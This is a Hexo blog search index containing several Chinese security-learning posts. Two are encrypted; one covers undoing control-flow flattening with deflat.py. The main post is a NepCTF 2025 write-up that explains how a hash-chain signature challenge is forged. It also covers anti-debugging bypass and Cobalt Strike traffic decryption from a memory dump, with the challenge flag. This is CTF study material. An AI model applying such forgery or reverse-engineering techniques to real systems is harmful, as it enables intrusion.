<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>安卓动调初步</title>
      <link href="/2025/08/07/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83%E5%88%9D%E6%AD%A5/"/>
      <url>/2025/08/07/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83%E5%88%9D%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="043373193a10acc497cd0daff312b5250f6c89e553fcfd56c9e5053bcaa5e0ea">7c4bd356602db2228a945912e2438dcb337bdf4ab766943d3075316556b125fefc645f51eaa98be0d306def52e0a4980517edeae4ba5c80d58bb3571f021dbe28e2c5933917621a96e583db1b2cb7c2cb121acc3ce230d3bd551552ad0d3a7d432502deb3de541ef0c9c1da3bdfa2529e67b747c5d08ea8697d0161d225bed0658d5fdee5e7b1edfcd5e0cb61d3937440beeb9af2d16b53d21231f01060ac547c8bf23c832aeece54f56bdcd489b31cc2998115aaaeae2f01f6f086a7e84128d1afeaba16c96fcf050267fac8f10e6cac28242a69a33287cc14f7c9925c87998398d9bfd70b426824df3f93c7e0ed80c2b946aebfbe98ec784b96aa1c31d39b8bffa8579350f3731cae3b02c2d4977984adefd671dbb6b437573cbe2f81939439870f5aef8e3b990637d49679a218b888375e08ccdbbde71f98916969b5e4493087076192d3efe7204937685ef0e4a739080a91cdd21ef44cf20c7e86c9ec0e027f66882ef4906a3e2ca47d89e4bef9674aaec64b5caffd3bdd78b15724615df895a5aae7a2051648cdc687dfa81ead02ad49d2bc45e4fdbafe88853982d5ce4cfede746eed461789d0551d4f0c89571c2de36eaedface33e4e307cf434c4500ac584f44cc98cbd27b55c56178c34e6ff9cb849687b0c782c1efa9d1c5263f6f22827718e9f5df7406a717d2d68dc2bc2129c09f5dd95f50852d3d1b65ea798f1a8c9288a4323df5ad71b8398e95b58ada4e3994d81264bee8006b7ae2abb96c98061c6a01c5fc283ed36451f6f31db8cc3b0ff115ce1fef3be4c0282ce36356e4063d8bab1bf017308c68230ceed355ed0524e42b319c1a17d2f7f40c1ca080dde85d0879147c9e1c38513110b7138990de8f4fc9c3f3d8f4808894d34674f787d8694e87c4794af6ac2d71a9fd81076e3441d8def7cd5c5449236022aacab6bcb00b55817d921bfe3bfc343c4c7a7c396bc2585a72a545afe9d8ebc02e7b6403ea53651adca2e36e5753dba847c7d48cb9242a8839692029392e48b48837bf0235c587c47b75c89be50eed5c458e43588f0b5806f6b3b95d30cc78670709d8233cbdce595c989473caf2f68b5adced76edc3f9cb6420b44fd9a4531bc224b43d37e5e01d6082315a2f69fd6e15f447556d799c42a13963eebad01cbac430f52ee19a05d0ac7eadf3c5bf0ffb6ea6501aca8df4a7cc1d0fcb6bdfda8736c7b3e91fffca9eb527bb8a07dd1ffb35d2d3e42ceaa828db26e93bd1b5177c34cbd2deb5bc2bb4dd51bfa75fab5f7a7ea3aaef5b7cb5c9f95211de300674749b7cd7d9889be880439357f50803f3a38697fe69185952758a8a031255d0281cc79359a421b67abb7769a3a08e92dcf492152af3aa8e04ddac2dcbabf11541bbabe0d2c2c12b895ac8e7d8f97365289c5652436785c7cb8d4ae59b5f512e6b79d8cc04d2e20ca65a028cddf981e9d9c440107180e76a86e34026228d549ae3efe29e8ac5a49b28b9c4025e8d0923f3573bb569c777828d0f9108d7bf60e5aa0d920cbea448e9a6e28c614da99fc9eacffbc90d1ecf23c2735977b8329942fc4f424d927720ad2a78b525239730126fbddf91c58059c90630025ba8683397ed41d04cffb65e6e8a1b79bd97a7213d5d6b8faeb64a8234b068be95f9fd978c5fe5f824b4fcba8a3497c367387c5bd3243f4a118a9ded712ad6f91c2f1a34d1ad8601343c75f21d8dc831d555ff9e1531ec5804dab8e657a677aeade755d42240803bf976fa3bada33d0aabab6e21d22de43ab7a7aa6606742adc8128f7fbfaf467a3aabab4e73a6d41735d1d0ba9b3cd3b74dbee271b63c9666cb439af20f9758af21ce73f19963da3e61edf7235b4efabd78c276ae6e25c20813d5ccf257b4cbea3121c2258a4674d1f8f9e7b6057e83ebac1d872ec0addaf09ec19dd01d29b3bc7bcf0a7b760e24431154daa1f4a04d14693595b44210a31f58205dab29e69e79483e0b46a8f4ff791fa23b790cc19a97b4cf51e3ddcfc1a159ad7db34ee0071ac3790fa17debb13edc61c48e0df37c537c4860544c41f7ec44a5cec11900a25103e48c808adc12006ca3dceb09cd1bc8a99d585077334187ae58878d8999acdd4860933dfc3d7010104432cfdc16493968a17df865f125d5c29cf7dde4f6a55eb1ba8408b1b0432ad8869df380ff42e22f0dd3d9aaa46c939981148b15b59cefc7da0690db1f7d2cbed1de66d2b7582947eda433317bfd858a6ab4c30c98f49f8f68640faa18a569e9546fdb6cf4b5612af9cc65eeb2961c7d3e2cb3d0b07f089d6d34d1cf7c4a00a792f9528d118d786ba1f0fd2323428f2d51aa32aa339da63fde42ccd9b8c170d2cf6b0560bd8907258373eccabaaf701261192336bfa1a06af09a75cf305dd824562583365dcb2fee0d00f8f56c316e4d1b2492ed682cf34942b34647ff8149ba630b72d68c6ea9fc054252881538a938f0ff3ff82886ada6f0516e1aa9339f509dabe0a5a66249c69b7ce888ce094feb7c133251aef094cf9089c5f5d7e9a933211253f4ca2471647fff1e345ce73100445ec99d0f65258d7e69891ce037238034888ae9635b40137a630f3469d0ea4e4860330b71016511417870b140a8bb30b8a52e84a35db79ff6da777bc582ebe6fbf8c044a57995212bb9512b5c7ec4d195d3c568bb5ab4b6ea7f0527de038e421b09c0800f49e4579789a60b3fe52a48506990049e58fa66f256e63f178b435a1d1378d3d17448657abb92882ccde243c3074517b339af05514c5cd0a2a52710f6ea9bf0acd08bd3be4e4b2fc74e2493ffa9f5d7d3b396596f0027e07ec6d1b8aa564fc303195e195c20531c2b5e90177980375203c7edf408a03091df8596d8bca1b355b3cb2430ed33c85ad6bde847edd64e57317eb40e47c913aaff619f4bf7fd3ae6dba9160c06fd11becb1b538f6b1d9abbf098ed4e36c86decd189cf1cf3d19b303ec1873ef023e8d9d068df71aa543effa121c6199eee2aeda8b260547d51b6be98a4e1179dfa0d4c515ff5d69de2db8a4583668a2a33e482071b53900ff042d82e9b1bf5645c2c2dfa41dcd2402a82978995e81e5796d9a3ebf1fadd5c0a5f18b06ececc7424399f80958b2850a086ce50dbac438917f4afeb6c484976900f3fa806b20d6be185c2343895c0822788de04be729c5f90f7e3e4b3f484cbb0a2c1f71b1458e7ff5a2379e0441584c2f54904f52774978b4b8890f3565009412ca43d027e4b8a34e178372a932e523c581f072df76393c64727bdaa2b73b578fba219d8bbc22363e08c72ed8885ed523d5cc16e8351e3da45938bdf87c55fdf00d470259f753db1d000660f487e0a1590e8fbcb6492b9ea516e99a0db43b77623b7f0c8ee44a82b6e9d43687181b668f14087eca206d19f4faa44a4bbc5c37303fd3b53c017f6f31830df9f3584adbd4f164a8acc7382dfe2a76b6b5e01e49730dd64d9969d6a39f27bfdb91532f6dbfc736666cac3d4fdc89fb7178b60295947f5d037c30080d298147bda668828537792e269af9b6582df9a9bf711361c9ca62ce58996dc3e426ebb3698e121d2cb15079fd3d6ae068e4fafcfb612a5c8f00abf67117845035dbb43ab4cfdc2084a70dee7187c58338d919699d3f04219e4f7e1a3ec6ab820b0c915bb597962e2bf94fe46a38b0db879594ab10412f3f6110df5017e792996e83f8f452051b3ec72755c4489fabc79b1af0d06027918ce86fef11ec7c54103ec2a4b6bf64f2c3550d9c20ed248bee7874882bfe51b59c31fb25842370af695955f00b8d2732887adca178a54f5acc6020d8b5bca9f401e508225ac10c5355f010c3b9335fa93b1cbf8a1e4142adac0fcf8e677b0f9b255363c3b94ad86cc2e55f7080c95bfbb11533237b7b6c033236200f0b167eb970b214992b0986b6f1046aba6b7442c9cc6f8686b89dc96d646a3bb36d20b96c150dd272ea666174d736eb909aad943b113ddeaf28b4057b102218a77de54c4ac9aba0dc90cb0a8b526dfc75a248e4b9d8ec0f56fb59a5a6a5b33fb97b6e794a7aae54ec17f6474220fb04a9befc1aeddc7d9ff64630d57995f2969449118f9fcaa1f77288bd49f5a4696b597fc396579b763ecf4dfeecab121653106e4986cc39cdaead07045c335246578ec3600e576cc39511383a1e5e663dc4f0d5218d55169a16a1988b8d5f4b7f134de537224bc5ed1f87aff90af6a74205c078e4e6da42f9aa1dd4d123b5d78b9a0f3a1049ff76789c493ab2dd122c40f30da3fdcd6f9d025d64408d2b2f4df73a07fa50b53b1e63a174b12d12411a7bbd9529e71769c7907589b4a8be5df4d8c155502656f12ac8349529082d565abc2ec2e9e22a0568aff8493c77dd0673acf85ac3fd035a5364dc09b26fa5a0c7d23ae1fc1069314591b7521429fe32da656f7130731bdf0b8343c2fbef5973530d263308b931102f8e48d157c5019f9a9d8a8be6ef6a97b5b6baee744d58c06fce8428e9a5b4e618046126bb019c398d73</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>控制流平坦化</title>
      <link href="/2025/08/03/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/"/>
      <url>/2025/08/03/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>之前安装对抗控制流平坦化的工具deflat.py但失败，今天成功了😃</p><p>控制流平坦化是一种代码混淆技术，就是让流程图平坦、扁平源码，把清晰的逻辑变得很难看懂</p><p><img src="/2025/08/03/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/image-20230409164158635.png" alt="image-20230409164158635"></p><p>原理讲解：<a href="https://bbs.kanxue.com/thread-284242.htm">https://bbs.kanxue.com/thread-284242.htm</a></p><p>去平坦化环境安装</p><p>windows环境</p><p>pip install angr</p><p><a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a></p><p>运行python deflat.py -f test –addr main函数地址</p><p><img src="/2025/08/03/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/image-20250803211248453.png" alt="image-20250803211248453"></p><p>未混淆的可执行文件</p><p><img src="/2025/08/03/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/image-20250803224034898.png" alt="image-20250803224034898"></p><p>平坦化的可执行文件</p><p><img src="/2025/08/03/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/image-20250803224123481.png" alt="image-20250803224123481"></p><p>去平坦化的可执行文件</p><p><img src="/2025/08/03/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/image-20250803224332994.png" alt="image-20250803224332994"></p><p>程序逻辑清晰了很多</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nepctf2025</title>
      <link href="/2025/08/01/Nepctf2025/"/>
      <url>/2025/08/01/Nepctf2025/</url>
      
        <content type="html"><![CDATA[<p>比赛进行的两天还在外地，这几天打算做一遍题目，题目很好啊，可惜我好菜😶</p><p>复现复现复现</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Nepsign"><a href="#Nepsign" class="headerlink" title="Nepsign"></a>Nepsign</h2><p>sm3参考链接：<a href="https://blog.csdn.net/qq_40662424/article/details/121637732">https://blog.csdn.net/qq_40662424/article/details/121637732</a></p><p>SM3是一种由中国国家密码管理局公布的商用密码杂凑算法，与SHA-256安全相当，四个步骤：消息填充、消息扩展、迭代压缩、输出结果。消息分组长度为512位，摘要长度为256位</p><p>分析server.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data</span>):</span><br><span class="line">    d = [i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    h = sm3.sm3_hash(d)</span><br><span class="line">    <span class="keyword">return</span> h</span><br></pre></td></tr></table></figure><p>用于计算输入数据的 SM3 哈希值 的 Python 函数，基于gmssl库</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">SM3_n</span>(<span class="params">data, n=<span class="number">1</span>, bits=<span class="number">256</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(SM3(data))</span><br><span class="line">    <span class="keyword">return</span> data.<span class="built_in">hex</span>()[:bits // <span class="number">4</span>]</span><br></pre></td></tr></table></figure><p><code>SM3_n</code> 是一个 迭代哈希计算函数，它对输入数据进行n次 SM3 哈希运算，并最终返回指定位数的哈希值</p><p>Nepsign类</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Nepsign</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.n = <span class="number">256</span></span><br><span class="line">        self.hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span> <span class="comment"># 16进制字符集</span></span><br><span class="line">        self.keygen() <span class="comment"># 生成密钥对</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">self</span>):</span><br><span class="line">        rng = SystemRandom()</span><br><span class="line">        self.sk = [rng.randbytes(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)]</span><br><span class="line">        self.pk = [SM3_n(self.sk[_], <span class="number">255</span>, self.n) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)]</span><br><span class="line">        <span class="keyword">return</span> self.sk, self.pk</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, msg, sk=<span class="literal">None</span></span>):</span><br><span class="line">        sk = sk <span class="keyword">if</span> sk <span class="keyword">else</span> self.sk</span><br><span class="line">        m = SM3(msg)</span><br><span class="line">        m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">        a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n // <span class="number">8</span>)]</span><br><span class="line">        step = [<span class="number">0</span>] * <span class="number">48</span>;</span><br><span class="line">        qq = [<span class="number">0</span>] * <span class="number">48</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            step[i] = a[i]</span><br><span class="line">            qq[i] = SM3_n(sk[i], step[i])</span><br><span class="line">        <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">                <span class="keyword">if</span> m[j - <span class="number">1</span>] == self.hex_symbols[i]:</span><br><span class="line">                    <span class="built_in">sum</span>[i] += j</span><br><span class="line">            step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span></span><br><span class="line">            qq[i + <span class="number">32</span>] = SM3_n(sk[i + <span class="number">32</span>], step[i + <span class="number">32</span>])</span><br><span class="line">        <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> qq]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, msg, qq, pk=<span class="literal">None</span></span>):</span><br><span class="line">        qq = [<span class="built_in">bytes</span>.fromhex(i) <span class="keyword">for</span> i <span class="keyword">in</span> qq]</span><br><span class="line">        pk = pk <span class="keyword">if</span> pk <span class="keyword">else</span> self.pk</span><br><span class="line">        m = SM3(msg)</span><br><span class="line">        m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">        a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n // <span class="number">8</span>)]</span><br><span class="line">        step = [<span class="number">0</span>] * <span class="number">48</span>;</span><br><span class="line">        pk_ = [<span class="number">0</span>] * <span class="number">48</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            step[i] = a[i]</span><br><span class="line">            pk_[i] = SM3_n(qq[i], <span class="number">255</span> - step[i])</span><br><span class="line">        <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">                <span class="keyword">if</span> m[j - <span class="number">1</span>] == self.hex_symbols[i]:</span><br><span class="line">                    <span class="built_in">sum</span>[i] += j</span><br><span class="line">            step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span></span><br><span class="line">            pk_[i + <span class="number">32</span>] = SM3_n(qq[i + <span class="number">32</span>], <span class="number">255</span> - step[i + <span class="number">32</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> pk_ == pk <span class="keyword">else</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>密钥生成keygen函数：使用随机数生成器生成48个32字节的私钥，对每个私钥进行255次SM3哈希得到公钥</p><p>签名函数sign:计算msg的SM3哈希并转化为256位二进制，将哈希分成32个8位组，前32个签名元素使用消息哈希的每个字节值作为迭代次数对私钥进行哈希，后16个签名元素计算每个十六进制字符在哈希中的位置和，取模255作为迭代次数，返回签名数组</p><p>验证函数verify:对签名进行”补足”哈希(255-step次)，应能得到公钥，比较计算出的公钥和存储的公钥是否一致</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;initializing...&#x27;</span>)</span><br><span class="line">Sign = Nepsign() <span class="comment"># 创建Nepsign实例，自动生成密钥对</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)):</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            msg = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;msg: &#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> msg != <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(Sign.sign(msg))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t do that&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            qq = literal_eval(<span class="built_in">input</span>(<span class="string">&#x27;give me a qq: &#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> Sign.verify(<span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>, qq):</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>实现了一个交互式的签名验证系统，选项一进行签名功能，但是不能对“happy for NepCTF 2025”签名，选项二验证happy for NepCTF 2025的签名，成功则会得到flag</p><p>看这篇wp的攻击思路：<a href="https://blog.csdn.net/2401_87558262/article/details/149733054">https://blog.csdn.net/2401_87558262/article/details/149733054</a></p><ol><li><strong>目标</strong><br>伪造消息 <code>b&#39;happy for NepCTF 2025&#39;</code> 的签名 <code>qq</code>，使得 <code>verify</code> 验证通过，从而获取flag。</li><li><strong>关键</strong><ul><li>验证时计算：<code>pk_[i] = SM3_n(qq[i], 255 - a[i])</code>，要求 <code>pk_[i] == pk[i]</code></li><li>公钥生成时：<code>pk[i] = SM3_n(sk[i], 255)</code></li><li>若 <code>a[i] = 0</code>，则 <code>qq[i] = sk[i]</code> 时验证必然通过（因为 <code>SM3_n(sk[i], 255) = pk[i]</code>）</li></ul></li><li><strong>攻击路径</strong><ul><li>通过其他消息的签名泄露 <code>sk[i]</code>（当 <code>a[i] = 0</code> 时，<code>qq[i] = sk[i]</code>）</li><li>组合所有 <code>sk[i]</code> 构造目标签名。</li></ul></li></ol><p>compute_steps(msg)计算目标消息的hash参数a[i]和sum[i]</p><p>collect_secrets(conn, msg_target, step_target)大量发送随机消息，找到满足a[i]&#x3D;0的消息，此时该消息的签名 qq[i] 就是 sk[i]（因为 SM3_n(sk[i], 0) &#x3D; sk[i]），重复直到找到48个sk[i]</p><p>forge_signature(secret_keys, step_ref)伪造目标签名，对每个 <code>sk[i]</code> 计算 <code>SM3_n(sk[i], a_target[i])</code>，得到目标签名 <code>qq[i]</code>。验证时SM3_n(qq[i], 255 - a_target[i]) &#x3D; SM3_n(sk[i], 255) &#x3D; pk[i]，必然通过。</p><p>ps:<a href="https://faritree.top/2025/07/28/NepCTF2025-Crypto-WP/%E8%BF%99%E9%87%8C%E6%98%AF%E5%AF%86%E7%A0%81%E5%AD%A6%E5%85%A8%E9%83%A8%E7%9A%84wp">https://faritree.top/2025/07/28/NepCTF2025-Crypto-WP/这里是密码学全部的wp</a>(tql😮,看到这道题很棒的思路</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">签名由48个哈希值组成，当私钥相同时，每个位置的哈希值只与当前位置和step[i]有关，step[i]由签名的消息确定。所以先求出happy for NepCTF 2025的step，然后随机选取一些消息发送给服务器，从返回的签名中拿到(i,step[i])对应的哈希值，需要的签名都拿到后，发给服务器就行。</span><br><span class="line">----出自FariTree的wp</span><br></pre></td></tr></table></figure><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="realme"><a href="#realme" class="headerlink" title="realme"></a>realme</h2><p>根据<a href="https://tkazer.github.io/2025/07/28/NepCTF2025/">Liv师傅的wp</a>复现</p><p>反调试没怎么做过，认识了scyllahide插件(也许该系统学一下🤔</p><p><img src="/2025/08/01/Nepctf2025/image-20250802103527546.png" alt="image-20250802103527546"></p><p>在main函数下面发现了sub_401A60,是一个rc4加密的变形函数，但是没有被调用，应该有反调试，使用Scyllahide插件一键过反调试，动调断点该处代码，发现被调用</p><p>有点问题…😣</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="客服小美"><a href="#客服小美" class="headerlink" title="客服小美"></a>客服小美</h2><p>根据<a href="https://dwd.moe/post/nepctf-2025%E5%A4%8D%E7%8E%B0">https://dwd.moe/post/nepctf-2025复现</a></p><p>vol2教程<a href="https://blog.csdn.net/m0_68012373/article/details/127419463">https://blog.csdn.net/m0_68012373/article/details/127419463</a></p><p><img src="/2025/08/01/Nepctf2025/image-20250803094605757.png" alt="image-20250803094605757"></p><p>得到内存镜像的操作系统Win10x64_19041</p><p>查看内存进程，发现可疑进程</p><p><img src="/2025/08/01/Nepctf2025/image-20250803095241245.png" alt="image-20250803095241245"></p><p>把这个进程dump出来6492.dmp</p><p>分析流量，筛选出http流量</p><p><img src="/2025/08/01/Nepctf2025/image-20250803102935913.png" alt="image-20250803102935913"></p><p><img src="/2025/08/01/Nepctf2025/image-20250803103016222.png" alt="image-20250803103016222"></p><p>其实这里可以看出通信的ip和端口</p><p>CS流量解密可以看一篇博客<a href="https://blog.csdn.net/AomCC/article/details/133298604">https://blog.csdn.net/AomCC/article/details/133298604</a></p><p>这里我直接用 <code>cs-extract-key.py</code> 尝试提取密钥</p><p><img src="/2025/08/01/Nepctf2025/image-20250803104104121.png" alt="image-20250803104104121"></p><p>通过提取的密钥解密</p><p> python cs-parse-traffic.py -k 35d34ac8778482751682514436d71e09:a6f4a04f8a6aa5ff27a5bcdd5ef3b9a7 .&#x2F;DESKTOP.pcapng</p><p>发现了用户名JohnDoe</p><p><img src="/2025/08/01/Nepctf2025/image-20250803104529272.png" alt="image-20250803104529272"></p><p>发现了secret.txt</p><p><img src="/2025/08/01/Nepctf2025/image-20250803104625879.png" alt="image-20250803104625879"></p><p>得到了flag NepCTF{JohnDoe_192.168.27.132:12580_5c1eb2c4-0b85-491f-8d50-4e965b9d8a43}</p><p>未完待续</p><p>参考的好多wp🤩(真强啊</p><p><a href="https://blog.csdn.net/2401_87558262/article/details/149733054">https://blog.csdn.net/2401_87558262/article/details/149733054</a></p><p><a href="https://www.cnblogs.com/LAMENTXU/articles/19007988">https://www.cnblogs.com/LAMENTXU/articles/19007988</a></p><p><a href="https://faritree.top/2025/07/28/NepCTF2025-Crypto-WP/">https://faritree.top/2025/07/28/NepCTF2025-Crypto-WP/</a></p><p><a href="https://tkazer.github.io/2025/07/28/NepCTF2025/">https://tkazer.github.io/2025/07/28/NepCTF2025/</a></p><p><a href="https://2hi5hu.cn/archives/nepctf2025">https://2hi5hu.cn/archives/nepctf2025</a></p><p><a href="https://dwd.moe/post/nepctf-2025">https://dwd.moe/post/nepctf-2025</a></p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Re的记录</title>
      <link href="/2025/07/19/Re%E7%9A%84%E8%AE%B0%E5%BD%95/"/>
      <url>/2025/07/19/Re%E7%9A%84%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="555db9fa8e117affd6031a46632729ae5de0561dd57e0672dcd7c459cf2adb5d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>以后</title>
      <link href="/2025/07/16/%E4%BB%A5%E5%90%8E/"/>
